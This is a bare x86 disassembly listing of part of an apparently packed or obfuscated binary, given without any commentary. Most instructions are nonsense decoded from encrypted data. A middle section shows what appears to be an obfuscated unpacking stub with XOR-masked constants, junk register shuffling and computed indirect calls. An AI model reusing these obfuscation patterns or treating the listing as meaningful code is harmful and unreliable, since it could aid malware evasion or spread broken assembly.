  40cc9c:	lock bound esp,QWORD PTR [eax+0x2f8f5167]
  40cca3:	std    
  40cca4:	cmp    DWORD PTR [edi+0x343ddd6f],esi
  40ccaa:	inc    edx
  40ccab:	xchg   ebp,eax
  40ccac:	shr    BYTE PTR [eax+0x846eb7f],1
  40ccb2:	sub    DWORD PTR [ebx],esi
  40ccb4:	jle    0x40cc56
  40ccb6:	sti    
  40ccb7:	inc    edx
  40ccb8:	ins    BYTE PTR es:[edi],dx
  40ccb9:	dec    ebx
  40ccba:	scas   eax,DWORD PTR es:[edi]
  40ccbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccbc:	scas   eax,DWORD PTR es:[edi]
  40ccbd:	ret    
  40ccbe:	dec    eax
  40ccbf:	adc    eax,0x6eb66372
  40ccc4:	das    
  40ccc5:	xchg   esi,eax
  40ccc6:	hlt    
  40ccc7:	lea    edx,[edi+edi*8-0x773e52e1]
  40ccce:	ins    DWORD PTR es:[edi],dx
  40cccf:	mov    ds:0xae0e0b49,eax
  40ccd4:	mov    dh,0x20
  40ccd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccd7:	int3   
  40ccd8:	jecxz  0x40cc6a
  40ccda:	xor    esp,DWORD PTR [edx+0x3b]
  40ccdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccde:	cmp    eax,0x8bfeed56
  40cce3:	mov    eax,0x64d31b5c
  40cce8:	fst    QWORD PTR [edx-0xc300a56]
  40ccee:	push   esi
  40ccef:	in     eax,0x4d
  40ccf1:	ss ja  0x40cce4
  40ccf4:	mov    esp,0xe47c98b9
  40ccf9:	jo     0x40cd3f
  40ccfb:	xor    BYTE PTR [ebx+0x18],cl
  40ccfe:	(bad)  
  40ccff:	push   ebx
  40cd00:	jmp    0x40cd00
  40cd02:	mov    ecx,0x3c54c553
  40cd07:	cli    
  40cd08:	fprem  
  40cd0a:	mov    ds:0x8e1d93de,eax
  40cd0f:	gs neg edi
  40cd12:	enter  0xcf89,0x80
  40cd16:	stc    
  40cd17:	iret   
  40cd18:	fisubr DWORD PTR [esi+eax*4-0x5bd609d1]
  40cd1f:	jb     0x40ccd7
  40cd21:	(bad)  
  40cd22:	jmp    0xa0f3:0xb16388fe
  40cd29:	stos   BYTE PTR es:[edi],al
  40cd2a:	int3   
  40cd2b:	jg     0x40cd79
  40cd2d:	aam    0xc8
  40cd2f:	mov    al,ds:0x7e8cdaf7
  40cd34:	das    
  40cd35:	fsubr  QWORD PTR [esi+0x1d416c32]
  40cd3b:	dec    esp
  40cd3c:	repnz cmp bh,dh
  40cd3f:	dec    eax
  40cd40:	test   BYTE PTR [eax],bl
  40cd42:	inc    edx
  40cd43:	cld    
  40cd44:	pusha  
  40cd45:	jle    0x40cdb4
  40cd47:	mov    ebx,0xac92d612
  40cd4c:	adc    bh,BYTE PTR [ebp-0x60695432]
  40cd52:	int    0x77
  40cd54:	call   0x4a48:0xf2fc9fdc
  40cd5b:	sub    DWORD PTR [edx+0x3a876201],ebx
  40cd61:	dec    edx
  40cd62:	retf   
  40cd63:	sub    al,0x7e
  40cd65:	into   
  40cd66:	jmp    0x8ec1240c
  40cd6b:	push   ecx
  40cd6c:	inc    eax
  40cd6d:	inc    ebp
  40cd6e:	pop    edx
  40cd6f:	jmp    0x27910d18
  40cd74:	scas   eax,DWORD PTR es:[edi]
  40cd75:	xor    BYTE PTR [edi+0x5c],ch
  40cd78:	rol    DWORD PTR [esi],0xde
  40cd7b:	pop    esi
  40cd7c:	rcr    DWORD PTR [esi+ebp*8],0x52
  40cd80:	xor    BYTE PTR [eax],al
  40cd82:	inc    edx
  40cd83:	ins    DWORD PTR es:[edi],dx
  40cd84:	fs push cs
  40cd86:	js     0x40cd29
  40cd88:	pop    ecx
  40cd89:	adc    ebx,eax
  40cd8b:	in     al,dx
  40cd8c:	sbb    al,0x6e
  40cd8e:	fwait
  40cd8f:	popa   
  40cd90:	sti    
  40cd91:	sub    BYTE PTR [esi],dl
  40cd93:	imul   ebp,DWORD PTR ds:0x932f982d,0x22085ec6
  40cd9d:	adc    ch,BYTE PTR [eax]
  40cd9f:	dec    ecx
  40cda0:	or     BYTE PTR [ebx+0x6a],al
  40cda3:	int    0x9
  40cda5:	xor    al,0x27
  40cda7:	cmp    dh,BYTE PTR [ecx+0x7d17b3d3]
  40cdad:	push   edx
  40cdae:	xor    cl,BYTE PTR [edi-0x6d32f1e]
  40cdb4:	cli    
  40cdb5:	and    BYTE PTR [ecx+ebx*8],al
  40cdb8:	leave  
  40cdb9:	add    ah,BYTE PTR [edx-0x6c]
  40cdbc:	jne    0x40cddc
  40cdbe:	sub    al,0xff
  40cdc0:	and    DWORD PTR [ebx+0xa],esp
  40cdc3:	sbb    DWORD PTR [ecx],edx
  40cdc5:	fisttp DWORD PTR [ecx]
  40cdc7:	pop    edx
  40cdc8:	mov    ds:0x56cf8b2d,eax
  40cdcd:	imul   ecx,ebp,0xd04b1c15
  40cdd3:	jge    0x40cdec
  40cdd5:	mov    dl,cl
  40cdd7:	sbb    DWORD PTR [edx],ebx
  40cdd9:	int    0x61
  40cddb:	jl     0x40cd97
  40cddd:	jne    0x40ce05
  40cddf:	out    dx,al
  40cde0:	dec    ecx
  40cde1:	mov    edi,0xbc2c45ca
  40cde6:	rcr    DWORD PTR [esi+0xc],1
  40cde9:	fwait
  40cdea:	xlat   BYTE PTR ds:[ebx]
  40cdeb:	fs mov esi,0xb7a331f5
  40cdf1:	sar    BYTE PTR [edi],cl
  40cdf3:	pop    edx
  40cdf4:	inc    eax
  40cdf5:	mov    bh,0xc7
  40cdf7:	mov    ch,0xe5
  40cdf9:	cdq    
  40cdfa:	xchg   ebp,eax
  40cdfb:	out    dx,al
  40cdfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdfd:	pop    edx
  40cdfe:	ficomp DWORD PTR [edx]
  40ce00:	jbe    0x40cda8
  40ce02:	ins    BYTE PTR es:[edi],dx
  40ce03:	out    0x6d,eax
  40ce05:	packuswb mm2,QWORD PTR [esi]
  40ce08:	loope  0x40cdd6
  40ce0a:	(bad)
  40ce0e:	push   edx
  40ce0f:	pop    ebx
  40ce10:	or     dh,al
  40ce12:	bound  eax,QWORD PTR [esi]
  40ce14:	push   eax
  40ce15:	pop    ebp
  40ce16:	mov    ch,0x9e
  40ce18:	jmp    0x6d00cfc
  40ce1d:	out    0xd,eax
  40ce1f:	nop
  40ce20:	ss xchg esp,eax
  40ce22:	inc    BYTE PTR [ecx]
  40ce24:	adc    eax,0xc2fd3a50
  40ce29:	push   cs
  40ce2a:	jge    0x40ce2e
  40ce2c:	(bad)  
  40ce2d:	repnz mov bl,0xca
  40ce30:	ret    0x4d57
  40ce33:	fs (bad) 
  40ce36:	into   
  40ce37:	shr    dl,cl
  40ce39:	dec    ecx
  40ce3a:	mov    ah,0x96
  40ce3c:	inc    ecx
  40ce3d:	bound  ebx,QWORD PTR [ebp+0x5575f8cb]
  40ce43:	pop    ebx
  40ce44:	pavgw  mm3,mm0
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c56
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42385a
  40cf91:	push   0x423812
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a76
  40cff7:	mov    ebx,DWORD PTR ds:0x421a9e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c56
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421cda
  40d0ed:	mov    esi,DWORD PTR ds:0x421cd2
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421cd2,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	loop   0x40d0bc
  40d113:	inc    esp
  40d114:	sub    eax,0x6262d1c2
  40d119:	jmp    0x40d17a
  40d11b:	bound  esp,QWORD PTR [edx-0x14]
  40d11e:	sbb    DWORD PTR [edx],edi
  40d120:	xchg   esi,eax
  40d121:	ror    bh,cl
  40d123:	dec    ebx
  40d124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d125:	xchg   ebx,eax
  40d126:	xor    al,0xb9
  40d128:	ja     0x40d197
  40d12a:	sbb    al,0x38
  40d12c:	loope  0x40d194
  40d12e:	lds    ebx,FWORD PTR [ebp+0x42]
  40d131:	hlt    
  40d132:	dec    ebp
  40d133:	leave  
  40d134:	not    DWORD PTR [edi]
  40d136:	push   es
  40d137:	stos   DWORD PTR es:[edi],eax
  40d138:	out    dx,eax
  40d139:	inc    ebp
  40d13a:	pop    edi
  40d13b:	mov    gs,WORD PTR [edi-0x319d94a1]
  40d141:	ja     0x40d1ab
  40d143:	mov    ebx,0xe068d3a6
  40d148:	xlat   BYTE PTR ds:[ebx]
  40d149:	push   ds
  40d14a:	nop
  40d14b:	jecxz  0x40d0d7
  40d14d:	mov    ds:0xb53f9a09,eax
  40d152:	xchg   esi,eax
  40d153:	outs   dx,DWORD PTR ds:[esi]
  40d154:	test   edx,ebp
  40d156:	out    0xd4,eax
  40d158:	push   eax
  40d159:	push   cs
  40d15a:	rcl    DWORD PTR [edi-0x36f87fb7],1
  40d160:	mov    eax,DWORD PTR [esp+eiz*2+0x73689046]
  40d167:	xchg   ebp,eax
  40d168:	cdq    
  40d169:	and    DWORD PTR [edi],esp
  40d16b:	es push esi
  40d16d:	xor    dl,BYTE PTR [edx+eiz*8]
  40d170:	inc    edi
  40d171:	mov    ebx,0xc2e1baf6
  40d176:	setg   cl
  40d179:	cmp    eax,ebp
  40d17b:	vpmacsswd xmm8,xmm0,xmm3,XMMWORD PTR [ebx+0x34]
  40d182:	cmp    cl,BYTE PTR [esi+edi*4-0x210d9286]
  40d189:	or     ah,BYTE PTR [esp+eax*2]
  40d18c:	call   0xd88d:0xf290a1ec
  40d193:	lock mov ebx,0x9680a0d
  40d199:	xor    ah,al
  40d19b:	jae    0x40d19d
  40d19d:	xchg   BYTE PTR [edi+0x75],bh
  40d1a0:	lea    eax,[edx+esi*1]
  40d1a3:	push   ebp
  40d1a4:	jl     0x40d1a4
  40d1a6:	addr16 call 0xdb36:0x50186bea
  40d1ae:	test   al,0xe0
  40d1b0:	xor    eax,0x87d5b770
  40d1b5:	or     dh,dl
  40d1b7:	retf   0xaa1a
  40d1ba:	fcomp  QWORD PTR [edi+0x11a835d3]
  40d1c0:	add    al,0xb1
  40d1c2:	stos   BYTE PTR es:[edi],al
  40d1c3:	and    eax,0xc97b01af
  40d1c8:	out    dx,eax
  40d1c9:	ins    BYTE PTR es:[edi],dx
  40d1ca:	bound  eax,QWORD PTR [ecx+0x3d]
  40d1cd:	imul   edi,DWORD PTR [eax-0xb71f252],0x7dd468aa
  40d1d7:	push   es
  40d1d8:	lock adc eax,0xe1927ebb
  40d1de:	in     eax,dx
  40d1df:	fucomp st(1)
  40d1e1:	out    0x65,al
  40d1e3:	dec    ebp
  40d1e4:	test   BYTE PTR [esp+edi*8],dl
  40d1e7:	scas   eax,DWORD PTR es:[edi]
  40d1e8:	mov    ds:0x1b0faacf,al
  40d1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1ee:	adc    al,0x46
  40d1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f1:	and    eax,0xf069ccdd
  40d1f6:	lods   al,BYTE PTR ds:[esi]
  40d1f7:	(bad)  
  40d1f9:	sbb    BYTE PTR [esi+0x7d07b6fc],dl
  40d1ff:	sbb    edx,DWORD PTR [edi-0x70]
  40d202:	icebp  
  40d203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d204:	adc    dl,dh
  40d206:	ja     0x40d216
  40d208:	sub    DWORD PTR [eax+0x5f],esi
  40d20b:	pop    ss
  40d20c:	rol    BYTE PTR [esi+0x0],0xf7
  40d210:	jns    0x40d219
  40d212:	inc    eax
  40d213:	js     0x40d209
  40d215:	es call 0xc4935f07
  40d21b:	in     al,0x21
  40d21d:	nop
  40d21e:	in     al,dx
  40d21f:	pusha  
  40d220:	inc    ebx
  40d221:	inc    esi
  40d222:	cmc    
  40d223:	xchg   ebx,eax
  40d224:	call   0x6708:0x5f6b0424
  40d22b:	xor    dh,cl
  40d22d:	out    dx,al
  40d22e:	cmp    BYTE PTR [edi-0x1e],ah
  40d231:	ret    0xf29c
  40d234:	jmp    0xbdefd166
  40d239:	std    
  40d23a:	loope  0x40d21f
  40d23c:	mov    eax,ds:0xde031559
  40d241:	(bad)  
  40d242:	push   ebx
  40d243:	pop    esi
  40d244:	adc    al,0x52
  40d246:	or     ch,cl
  40d248:	dec    edx
  40d249:	inc    edi
  40d24a:	mov    dh,0x23
  40d24c:	and    BYTE PTR [eax],bl
  40d24e:	dec    esi
  40d24f:	xchg   DWORD PTR [esi],esi
  40d251:	push   ebx
  40d252:	mov    ch,0xa
  40d254:	dec    esp
  40d255:	fcom   DWORD PTR [esi+0x1c]
  40d258:	call   0xa085:0xe8d11a49
  40d25f:	push   cs
  40d260:	fisttp QWORD PTR [eax-0x6b]
  40d263:	adc    al,0x31
  40d265:	sbb    eax,0xd211867c
  40d26a:	or     BYTE PTR [eax+eiz*2],dl
  40d26d:	fsub   QWORD PTR [edx+0x5a]
  40d270:	mov    WORD PTR [ebp+0x5aadf84f],?
  40d276:	mov    bl,0xac
  40d278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d279:	dec    ecx
  40d27a:	sbb    BYTE PTR [ebx+0x12],cl
  40d27d:	jecxz  0x40d2f5
  40d27f:	inc    ebx
  40d280:	mov    DWORD PTR [edi-0x2f],ebp
  40d283:	sub    BYTE PTR [ecx],bl
  40d285:	lds    esi,FWORD PTR [esi-0x67507bbd]
  40d28b:	not    BYTE PTR [esi+0x1f]
  40d28e:	mov    al,ds:0x81e2e237
  40d293:	adc    BYTE PTR [eax-0x2a],0x5
  40d297:	sbb    al,0x6f
  40d299:	imul   ecx,esp,0x12
  40d29c:	dec    eax
  40d29d:	mov    bl,0x42
  40d29f:	xor    eax,eax
  40d2a1:	adc    DWORD PTR [esi+0x70],esp
  40d2a4:	mov    dh,al
  40d2a6:	jge    0x40d2b3
  40d2a8:	cmp    al,0x6c
  40d2aa:	pop    es
  40d2ab:	mov    al,0xf6
  40d2ad:	mov    DWORD PTR [esi+0xc],ebx
  40d2b0:	shl    DWORD PTR [esi-0x2e],cl
  40d2b3:	stc    
  40d2b4:	sbb    bh,BYTE PTR [edi+0x2a]
  40d2b7:	lds    edi,FWORD PTR [ecx+0x6e]
  40d2ba:	or     cl,BYTE PTR [edx+ebx*8]
  40d2bd:	cmp    BYTE PTR [eax+ecx*2],ch
  40d2c0:	rol    DWORD PTR [eax+0x12],cl
  40d2c3:	adc    al,0x42
  40d2c5:	sahf   
  40d2c6:	mov    al,ds:0x5db60a8d
  40d2cb:	push   cs
  40d2cc:	fwait
  40d2cd:	mov    bl,BYTE PTR [ebp+0x1d]
  40d2d0:	sub    eax,0x4f9094d0
  40d2d5:	xchg   ebx,eax
  40d2d6:	mov    bh,0xdf
  40d2d8:	icebp  
  40d2d9:	leave  
  40d2da:	mov    DWORD PTR [edi+0x66],edx
  40d2dd:	lods   al,BYTE PTR ds:[esi]
  40d2de:	pop    ds
  40d2df:	or     DWORD PTR [edx-0x52],ecx
  40d2e2:	mov    ecx,0xde53c37e
  40d2e7:	ret    0x2d63
  40d2ea:	cmp    al,bh
  40d2ec:	loop   0x40d272
  40d2ee:	bnd jmp 0x40d2cf
  40d2f1:	imul   edi,DWORD PTR [ebx],0xead3f74a
  40d2f7:	or     BYTE PTR [esi],0xf4
  40d2fa:	lahf   
  40d2fb:	xchg   edx,eax
  40d2fc:	mov    BYTE PTR [esi],ah
  40d2fe:	adc    BYTE PTR [eax+ebp*8+0x2f90a19d],dh
  40d305:	jno    0x40d364
  40d307:	sbb    dl,BYTE PTR [esi-0x7f]
  40d30a:	(bad)  
  40d30b:	mov    esi,0xc7f931d5
  40d310:	and    bh,BYTE PTR [edx]
  40d312:	xchg   ebp,eax
  40d313:	imul   ebp,DWORD PTR [edi],0x341e471b
  40d319:	mov    ebp,0x2961441d
  40d31e:	fcom   DWORD PTR [esi-0x1043738f]
  40d324:	jl     0x40d34d
  40d326:	add    ebx,edx
  40d328:	xor    eax,0x79d823cf
  40d32d:	ins    DWORD PTR es:[edi],dx
  40d32e:	xor    ebx,DWORD PTR [eax-0x2e]
  40d331:	test   al,0xe
  40d333:	out    dx,al
  40d334:	repnz mov ah,0xce
  40d337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d338:	push   ds
  40d339:	xchg   esp,ecx
  40d33b:	push   edi
  40d33c:	jmp    0x8ad14aca
  40d341:	fcmovbe st,st(6)
  40d343:	(bad)  
  40d344:	add    al,0x43
  40d346:	ss dec eax
  40d348:	and    al,0x71
  40d34a:	jmp    0x40d3c3
  40d34c:	xchg   BYTE PTR [edi],dh
  40d34e:	mov    dl,0x38
  40d350:	cmp    al,0x36
  40d352:	test   al,0xfc
  40d354:	mov    esi,0xb4c45692
  40d359:	aaa    
  40d35a:	rcl    al,cl
  40d35c:	mov    ebx,0x8eccb4f
  40d361:	sub    eax,0x73bf6973
  40d366:	lock cmp eax,0x1c88f549
  40d36c:	pop    ecx
  40d36d:	stos   DWORD PTR es:[edi],eax
  40d36e:	neg    ah
  40d370:	and    ebx,DWORD PTR [ebx+0x528b0b3e]
  40d376:	mov    ah,0xff
  40d378:	or     ebp,ebx
  40d37a:	pop    ds
  40d37b:	xchg   esp,eax
  40d37c:	scas   eax,DWORD PTR es:[edi]
  40d37d:	pop    eax
  40d37e:	sbb    BYTE PTR [eax+0x6],ch
  40d381:	and    DWORD PTR es:[esi-0x7c08c9da],ecx
  40d388:	stos   BYTE PTR es:[edi],al
  40d389:	mov    edx,DWORD PTR [ebp+0x673e986e]
  40d38f:	pusha  
  40d390:	pop    ebx
  40d391:	in     eax,0x49
  40d393:	sbb    eax,0xad11b969
  40d398:	cdq    
  40d399:	(bad)  
  40d39a:	in     al,dx
  40d39b:	nop
  40d39c:	shl    DWORD PTR [edi+0x5b],1
  40d39f:	adc    edi,eax
  40d3a1:	ins    DWORD PTR es:[edi],dx
  40d3a2:	add    eax,0x88f487de
  40d3a7:	test   DWORD PTR [esi+0x74],edx
  40d3aa:	pop    edx
  40d3ab:	pop    es
  40d3ac:	xor    eax,0xd18abb60
  40d3b1:	xchg   ebx,eax
  40d3b2:	popf   
  40d3b3:	inc    eax
  40d3b4:	shl    BYTE PTR [ebp-0x385a3225],0xed
  40d3bb:	cmp    al,0xf2
  40d3bd:	mov    BYTE PTR [edi],dl
  40d3bf:	sbb    al,0x1d
  40d3c1:	jg     0x40d3ca
  40d3c3:	in     eax,dx
  40d3c4:	add    ebp,esp
  40d3c6:	xchg   ebx,eax
  40d3c7:	mov    ebx,0xebc2e26
  40d3cc:	add    bl,BYTE PTR [ebp-0x2]
  40d3cf:	push   es
  40d3d0:	fst    QWORD PTR [edx-0x47570547]
  40d3d6:	jmp    0x40d418
  40d3d8:	mov    eax,ds:0xf560473f
  40d3dd:	mov    ch,0x5f
  40d3df:	rcr    DWORD PTR [edx+0x13f768d5],0x98
  40d3e6:	out    dx,al
  40d3e7:	retf   0xc122
  40d3ea:	popf   
  40d3eb:	jnp    0x40d3c2
  40d3ed:	inc    edi
  40d3ee:	aaa    
  40d3ef:	sub    DWORD PTR [eax+0x71],0x7d
  40d3f3:	fsubr  QWORD PTR [ebx-0x28e64da6]
  40d3f9:	rcl    ebp,0x3b
  40d3fc:	adc    DWORD PTR [esi+0x58bb10a2],ecx
  40d402:	enter  0x4942,0x4f
  40d406:	mov    DWORD PTR [edi],ebp
  40d408:	and    ecx,DWORD PTR [ecx]
  40d40a:	retf   
  40d40b:	xlat   BYTE PTR ds:[ebx]
  40d40c:	sub    DWORD PTR ds:[edx-0x51],0x523dbb91
  40d414:	xor    al,0x1e
  40d416:	in     al,0xcb
  40d418:	loopne 0x40d470
  40d41a:	popa   
  40d41b:	fmul   QWORD PTR [ebx-0x219e11c6]
  40d421:	outs   dx,DWORD PTR ds:[esi]
  40d422:	pop    es
  40d423:	ds int 0x14
  40d426:	dec    edx
  40d427:	lods   al,BYTE PTR ds:[esi]
  40d428:	push   es
  40d429:	jae    0x40d409
  40d42b:	repnz fs data16 jecxz 0x40d3b6
  40d430:	mov    ds:0xe96c81af,al
  40d435:	fnstsw WORD PTR [edi]
  40d437:	push   0xc8ffa1a6
  40d43c:	inc    ecx
  40d43d:	xchg   edi,eax
  40d43e:	push   0x46
  40d440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d441:	call   0x31f05588
  40d446:	adc    bh,cl
  40d448:	inc    ebp
  40d449:	xchg   ebx,eax
  40d44a:	mov    ah,0xca
  40d44c:	mov    esp,0xe4ded9c9
  40d451:	leave  
  40d452:	outs   dx,DWORD PTR ds:[esi]
  40d453:	pop    es
  40d454:	pop    eax
  40d455:	jmp    0x40d3e7
  40d457:	ficom  DWORD PTR [ebp+edx*1-0x43]
  40d45b:	push   es
  40d45c:	xor    ebp,DWORD PTR [edi-0x22fff46a]
  40d462:	adc    BYTE PTR [esi-0x40],cl
  40d465:	mov    esp,ds
  40d467:	outs   dx,BYTE PTR ds:[esi]
  40d468:	cmp    al,0x79
  40d46a:	and    al,0x3f
  40d46c:	(bad)  
  40d46d:	loope  0x40d46e
  40d46f:	inc    ebp
  40d470:	shl    DWORD PTR [ecx+0x3a],cl
  40d473:	cmp    al,0x3d
  40d475:	and    eax,0x522095b8
  40d47a:	icebp  
  40d47b:	inc    edi
  40d47c:	ret    
  40d47d:	dec    edi
  40d47e:	nop
  40d47f:	scas   eax,DWORD PTR es:[edi]
  40d480:	mov    ch,0x92
  40d482:	les    eax,FWORD PTR [edx-0x295f00e4]
  40d488:	cmp    edi,ecx
